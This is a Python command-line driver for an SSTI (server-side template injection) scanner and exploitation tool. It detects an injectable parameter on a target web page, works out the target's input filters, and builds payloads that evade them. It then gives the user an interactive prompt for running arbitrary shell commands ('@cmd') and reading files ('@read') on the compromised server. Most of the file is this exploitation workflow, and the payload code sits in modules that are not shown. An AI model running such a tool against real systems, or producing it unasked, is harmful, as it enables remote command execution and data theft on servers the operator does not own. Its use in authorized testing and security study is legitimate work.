import argparse
import json
import sys
from modules.utils import Utils, RequestHandler
from modules.genWAF import genWAF
from modules.detectParams import detectParams
from modules.genPayload import GenPayload

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SSTI Scanner")

    parser.add_argument("--url", help="URL of the target")
    parser.add_argument("--params", help="Parameters GET or POST of the target")
    parser.add_argument("--method", help="HTTP method (GET or POST)", default="GET")
    parser.add_argument("--cookie", help="Cookie for the request")
    parser.add_argument("--exec", help="Generate payload to execute command with WAF provide in waf.json")
    parser.add_argument("--read", help="Generate payload to read file with WAF provide in waf.json")
    parser.add_argument("--waf", help="Generate payload with custom WAF")
    parser.add_argument("--string", help="Generate string")
    parser.add_argument("--num", help="Generate number")

    utils = Utils()
    args = parser.parse_args()

    if args.exec:
        if args.waf:
            waf = utils.jsonFromFile(args.waf)["waf"]
            requestHandler = RequestHandler("", "", "", {}, "", False)
            genPayload = GenPayload(requestHandler, waf, isOffline=True)

            print(genPayload.exec(args.exec))
            exit(0)
        else:
            print("Error: The --waf argument is required.")
            exit(1)

    if args.read:
        if args.waf:
            waf = utils.jsonFromFile(args.waf)["waf"]
            requestHandler = RequestHandler("", "", "", {}, "", False)
            genPayload = GenPayload(requestHandler, waf, isOffline=True)

            print(genPayload.read(args.read))
            exit(0)
        else:
            print("Error: The --waf argument is required.")
            exit(1)

    if args.string:
        if args.waf:
            waf = utils.jsonFromFile(args.waf)["waf"]
            requestHandler = RequestHandler("", "", "", {}, "", False)
            genPayload = GenPayload(requestHandler, waf, isOffline=True)
        else:
            genPayload = GenPayload("", "", isOffline=True)
        print(genPayload.genString(args.string))
        exit(0)
    if args.num:
        if args.waf:
            waf = utils.jsonFromFile(args.waf)["waf"]
            requestHandler = RequestHandler("", "", "", {}, "", False)
            genPayload = GenPayload(requestHandler, waf, isOffline=True)
        else:
            genPayload = GenPayload("", "", isOffline=True)
        genPayload = GenPayload("", "", isOffline=True)
        print(genPayload.genNum(int(args.num)))
        exit(0)

    if not args.url:
        print("Error: The --url argument is required.")
        parser.print_help()
        sys.exit(1)

    if args.method not in ["GET", "POST"]:
        print("Error: The --method argument must be GET or POST.")
        parser.print_help()
        sys.exit(1)

    if not args.params:
        print("Error: The --params argument is required.")
        parser.print_help()
        sys.exit(1)

    params = args.params
    urlTarget = args.url
    if not utils.checkConnection(urlTarget):
        exit(1)
    method = args.method
    cookie = args.cookie
    isJsonBody = False
    if utils.isJson(params):
        isJsonBody = True
        params = json.loads(params)
    else:
        params = utils.parseParams(params)
    vulnParam = detectParams(urlTarget, method, params, cookie, isJsonBody)
    if vulnParam:
        isContinue = input("[*] Do you want to continue? (y/n): ").lower()
        if isContinue.lower() != "y":
            exit(1)
    requestHandler = RequestHandler(urlTarget, method, vulnParam, params, cookie, isJsonBody)
    genwaf = genWAF(requestHandler)
    waf = genwaf.generateWAF()
    genPayload = GenPayload(requestHandler, waf)

    command = ""
    canExec = genPayload.canExec()
    canRead = genPayload.canRead()
    hasOutput = genPayload.hasOutput()
    while command != "exit":
        if canExec:
            if not hasOutput:
                print("Type '@cmd [command]' to execute command (but there is no output)")
            else:
                print("Type '@cmd [command]' to execute command")
        if canRead:
            print("Type '@read' [filename] to read file")
        if not canExec and not canRead:
            print("Sorry but this tool can not do anything :(")
            exit()
        print("Type 'exit' to exit")
        command = input(">> ")
        if command.startswith("@cmd"):
            command = command.replace("@cmd ", "")
            if genPayload.hasOutput():
                print(genPayload.exec(command))
            else:
                print(genPayload.execPayloadNoOutput(command))
        elif command.startswith("@read") and genPayload.canRead():
            filename = command.replace("@read ", "")
            print(genPayload.read(filename))
